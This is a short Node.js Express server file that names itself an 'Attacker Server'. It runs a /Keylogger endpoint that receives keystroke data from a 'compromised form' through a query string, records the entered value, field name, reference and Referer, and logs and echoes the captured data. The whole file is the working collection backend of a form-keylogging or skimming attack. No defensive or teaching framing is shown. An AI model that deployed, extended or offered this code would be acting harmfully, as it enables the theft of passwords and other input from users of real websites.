var express = require( 'express' );
var app = express();

// Static files
app.use( express.static( 'public' ) );

app.listen( 8000, function () {
  console.log( 'Example app listening on port 8000!' );
} );



app.get( '/', function ( req, res ) {
  res.send( 'Attacker Server is running!' );
} );

app.get( '/Keylogger', function( req, res ) {

    var kQueryString = req.query.k;
    
    if( !kQueryString || kQueryString === null ) { 
        
        res.send( 'didn\'t understand your log' );
        console.log( "invalid or missing 'k' querystring" );

    } else {    

        var recievedData = kQueryString.split( ',' );
        var data = {
            referrer: req.get( 'Referer' ) || "not available",
            fieldModified: recievedData[1],
            enteredValue: recievedData[0],
            uniqueRef: recievedData[2]
        }

        console.log( "Captured k querystring data", JSON.stringify( data, null, 3 ) );
        res.send( "Recieved following data from compromised form: " + JSON.stringify( data, null, 3 ) );
    }
})